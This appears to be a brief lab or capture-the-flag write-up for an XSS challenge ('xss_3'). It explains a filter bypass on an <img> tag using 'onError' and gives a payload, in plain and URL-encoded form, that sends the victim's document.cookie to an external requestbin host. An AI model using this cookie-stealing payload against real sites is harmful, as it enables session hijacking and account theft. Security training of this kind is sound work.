# xss_3 - DOM Based on <img> (no `onerror`, case sensitive)
- Here we need to construct a payload that is submitted as part of the form, so this is best done with Burp using intercept to replace the ‘highlight’ value to the URL encoded payload.
- Payload (plain), `x" onError="this['on'+'error']=null;this.src='http://requestbin.fullcontact.com/18kxbln1?c='+document.cookie;">`
- Payload (encoded), `%78%22%20%6f%6e%45%72%72%6f%72%3d%22%74%68%69%73%5b%27%6f%6e%27%2b%27%65%72%72%6f%72%27%5d%3d%6e%75%6c%6c%3b%74%68%69%73%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%72%65%71%75%65%73%74%62%69%6e%2e%66%75%6c%6c%63%6f%6e%74%61%63%74%2e%63%6f%6d%2f%31%38%6b%78%62%6c%6e%31%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%22%3e`
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528362023097_Screenshot+2018-06-07+01.59.29.png)
